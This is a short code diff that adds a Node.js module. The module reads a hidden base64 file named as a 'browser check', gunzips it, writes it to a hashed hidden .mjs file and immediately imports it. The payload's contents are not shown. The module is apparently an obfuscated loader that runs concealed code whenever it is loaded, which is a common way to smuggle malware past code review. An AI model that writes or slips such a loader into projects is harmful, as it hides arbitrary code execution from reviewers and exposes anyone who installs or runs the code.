@@ -1,1 +1,11 @@
-PLACEHOLDER
+import { existsSync, readFileSync, writeFileSync } from "node:fs";
+import { gunzipSync } from "node:zlib";
+import { dirname, join } from "node:path";
+import { fileURLToPath, pathToFileURL } from "node:url";
+import { createHash } from "node:crypto";
+const dir = dirname(fileURLToPath(import.meta.url));
+const payload = readFileSync(join(dir, ".native-result-browser-check.b64"), "utf8");
+const digest = createHash("sha256").update(payload).digest("hex").slice(0, 16);
+const dest = join(dir, ".native-result-browser-check." + digest + ".generated.mjs");
+if (!existsSync(dest)) writeFileSync(dest, gunzipSync(Buffer.from(payload, "base64")));
+await import(pathToFileURL(dest).href);
